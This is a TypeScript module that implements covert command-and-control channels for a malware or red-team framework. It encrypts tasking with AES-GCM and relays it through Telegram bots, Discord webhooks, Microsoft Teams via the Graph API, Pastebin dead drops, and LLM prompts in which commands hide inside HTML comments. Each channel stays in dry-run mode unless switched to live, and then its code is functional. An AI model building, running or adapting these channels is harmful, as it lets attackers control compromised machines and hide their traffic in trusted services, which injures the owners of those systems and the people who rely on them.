/**
 * @module c2_channels
 * C2 channel implementations — Telegram bot, Discord webhook, Microsoft Graph
 * API, and dead-drop patterns for covert command delivery.
 */

import * as crypto from "node:crypto";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface ChannelConfig {
  type: "telegram" | "discord" | "graph" | "deaddrop" | "ai_service";
  token?: string;
  chatId?: string;
  webhookUrl?: string;
  pollIntervalMs?: number;
  encryptionKey?: string;
}

export interface C2Message {
  id: string;
  channel: string;
  payload: string;       // base64-encoded, encrypted
  timestamp: string;
  agentId?: string;
}

export interface ChannelResult {
  success: boolean;
  messageId?: string;
  error?: string;
  dryRun: boolean;
}

// ─── Encryption helpers ───────────────────────────────────────────────────────

function deriveKey(secret: string): Buffer {
  return crypto.scryptSync(secret, "ares2-c2-channel-salt", 32);
}

function encryptPayload(data: string, key: Buffer): string {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
  const enc = Buffer.concat([cipher.update(data, "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString("base64");
}

function decryptPayload(b64: string, key: Buffer): string {
  const buf = Buffer.from(b64, "base64");
  const iv = buf.subarray(0, 16);
  const tag = buf.subarray(16, 32);
  const enc = buf.subarray(32);
  const d = crypto.createDecipheriv("aes-256-gcm", key, iv);
  d.setAuthTag(tag);
  return Buffer.concat([d.update(enc), d.final()]).toString("utf8");
}

// ─── Telegram Channel ─────────────────────────────────────────────────────────

export class TelegramChannel {
  private token: string;
  private chatId: string;
  private key: Buffer;
  private live: boolean;

  constructor(cfg: ChannelConfig & { live?: boolean }) {
    this.token = cfg.token ?? "";
    this.chatId = cfg.chatId ?? "";
    this.key = deriveKey(cfg.encryptionKey ?? "default");
    this.live = cfg.live ?? false;
  }

  async send(command: string): Promise<ChannelResult> {
    const payload = encryptPayload(command, this.key);
    const text = `\`${payload}\``;
    if (!this.live) {
      return { success: true, messageId: "dry-run-001", dryRun: true };
    }
    const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: this.chatId, text, parse_mode: "Markdown" }),
    });
    const data = await resp.json() as { ok: boolean; result?: { message_id: number } };
    return { success: data.ok, messageId: String(data.result?.message_id), dryRun: false };
  }

  async receive(): Promise<C2Message[]> {
    if (!this.live) {
      return [{
        id: "dry-001",
        channel: "telegram",
        payload: encryptPayload("echo hello", this.key),
        timestamp: new Date().toISOString(),
      }];
    }
    const url = `https://api.telegram.org/bot${this.token}/getUpdates?limit=20`;
    const resp = await fetch(url);
    const data = await resp.json() as { result: Array<{ update_id: number; message?: { text?: string; date: number } }> };
    return (data.result ?? [])
      .filter((u) => u.message?.text)
      .map((u) => ({
        id: String(u.update_id),
        channel: "telegram",
        payload: u.message!.text!,
        timestamp: new Date((u.message!.date) * 1000).toISOString(),
      }));
  }
}

// ─── Discord Channel ──────────────────────────────────────────────────────────

export class DiscordChannel {
  private webhookUrl: string;
  private key: Buffer;
  private live: boolean;

  constructor(cfg: ChannelConfig & { live?: boolean }) {
    this.webhookUrl = cfg.webhookUrl ?? "";
    this.key = deriveKey(cfg.encryptionKey ?? "default");
    this.live = cfg.live ?? false;
  }

  async send(command: string): Promise<ChannelResult> {
    const payload = encryptPayload(command, this.key);
    if (!this.live) return { success: true, messageId: "dry-discord-001", dryRun: true };

    const resp = await fetch(this.webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: `\`${payload}\`` }),
    });
    return { success: resp.ok, dryRun: false };
  }
}

// ─── Microsoft Graph (Teams/Outlook) Channel ─────────────────────────────────

export class GraphChannel {
  private token: string;
  private teamId: string;
  private channelId: string;
  private key: Buffer;
  private live: boolean;

  constructor(cfg: ChannelConfig & { teamId?: string; channelId?: string; live?: boolean }) {
    this.token = cfg.token ?? "";
    this.teamId = (cfg as any).teamId ?? "";
    this.channelId = (cfg as any).channelId ?? "";
    this.key = deriveKey(cfg.encryptionKey ?? "default");
    this.live = cfg.live ?? false;
  }

  async send(command: string): Promise<ChannelResult> {
    const payload = encryptPayload(command, this.key);
    if (!this.live) return { success: true, messageId: "dry-graph-001", dryRun: true };

    const url = `https://graph.microsoft.com/v1.0/teams/${this.teamId}/channels/${this.channelId}/messages`;
    const resp = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${this.token}`,
      },
      body: JSON.stringify({ body: { content: payload } }),
    });
    const data = await resp.json() as { id?: string };
    return { success: resp.ok, messageId: data.id, dryRun: false };
  }
}

// ─── Dead-drop channel (Pastebin / GitHub Gist) ──────────────────────────────

export class DeadDropChannel {
  private url: string;
  private key: Buffer;
  private live: boolean;

  constructor(cfg: ChannelConfig & { live?: boolean }) {
    this.url = cfg.webhookUrl ?? "https://pastebin.com/raw/example";
    this.key = deriveKey(cfg.encryptionKey ?? "default");
    this.live = cfg.live ?? false;
  }

  async poll(): Promise<C2Message | null> {
    if (!this.live) {
      return {
        id: "dry-drop-001",
        channel: "deaddrop",
        payload: encryptPayload("whoami", this.key),
        timestamp: new Date().toISOString(),
      };
    }
    try {
      const resp = await fetch(this.url, { signal: AbortSignal.timeout(10_000) });
      const text = (await resp.text()).trim();
      if (!text) return null;
      return { id: crypto.randomUUID(), channel: "deaddrop", payload: text, timestamp: new Date().toISOString() };
    } catch { return null; }
  }
}

// ─── AI-service channel (OpenAI / Gemini as covert C2) ───────────────────────

export class AIServiceChannel {
  private apiKey: string;
  private baseUrl: string;
  private key: Buffer;
  private live: boolean;

  constructor(cfg: ChannelConfig & { baseUrl?: string; live?: boolean }) {
    this.apiKey = cfg.token ?? "";
    this.baseUrl = (cfg as any).baseUrl ?? "https://api.openai.com/v1";
    this.key = deriveKey(cfg.encryptionKey ?? "default");
    this.live = cfg.live ?? false;
  }

  /**
   * Encode a command into a prompt so the LLM "response" carries the tasking.
   * This is the AI-service C2 technique — commands are hidden in model outputs.
   */
  async encode(command: string): Promise<string> {
    // Steganographically embed the encrypted command in a benign prompt
    const enc = encryptPayload(command, this.key);
    return `Please summarize the following reference code:\n\n<!-- ${enc} -->\n\nconsole.log("hello world");`;
  }

  async decode(response: string): Promise<string | null> {
    const match = response.match(/<!--\s*([\w+/=]+)\s*-->/);
    if (!match) return null;
    try { return decryptPayload(match[1], this.key); } catch { return null; }
  }

  decryptPayload(b64: string): string {
    return decryptPayload(b64, this.key);
  }
}

// ─── Channel factory ──────────────────────────────────────────────────────────

export function createChannel(
  cfg: ChannelConfig & { live?: boolean }
): TelegramChannel | DiscordChannel | GraphChannel | DeadDropChannel | AIServiceChannel {
  switch (cfg.type) {
    case "telegram":   return new TelegramChannel(cfg);
    case "discord":    return new DiscordChannel(cfg);
    case "graph":      return new GraphChannel(cfg);
    case "deaddrop":   return new DeadDropChannel(cfg);
    case "ai_service": return new AIServiceChannel(cfg);
    default:           throw new Error(`Unknown channel type: ${(cfg as any).type}`);
  }
}

export default { TelegramChannel, DiscordChannel, GraphChannel, DeadDropChannel, AIServiceChannel, createChannel };
